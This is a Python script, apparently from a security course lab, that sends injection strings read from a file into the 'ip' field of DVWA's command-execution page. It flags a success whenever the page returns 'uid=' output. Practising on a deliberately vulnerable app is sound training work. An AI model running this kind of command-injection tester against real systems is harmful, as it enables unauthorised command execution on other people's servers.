from bs4 import BeautifulSoup
import requests
import re

url = 'http://srvr/DVWA/vulnerabilities/exec/#'

cookies_jar = requests.cookies.RequestsCookieJar()
cookies_jar.set('PHPSESSID','')
cookies_jar.set('security','low')


def command_inject():
    commands = get_commands()
    for command in commands:
        result = try_command(command)
        print("-+"*40)
        print("<i>trying %s: %s " % (url, command))
        if check_result(result):
            print("<+>SUCCESS - command output found")
        else:
            print("<o>FAIL")


def get_commands():
    with open("escaped_commands.txt") as cfile:
        commands = cfile.readlines()
    return commands


def try_command(command):
    command = command.replace('\r', '').replace('\n', '')
    params = {'ip': command, 'Submit': 'Submit'}
    r = requests.post(url, params, auth=('itp270', 'itp270'), cookies=cookies_jar, )
    parseHTML = BeautifulSoup(r.text, 'html.parser')
    result = parseHTML.find('div', {'class': 'vulnerable_code_area'})
    return result


def check_result(result):
    if re.findall(r'.*uid\=.*', str(result)):
        return True
    return False


if __name__ == "__main__":
    command_inject()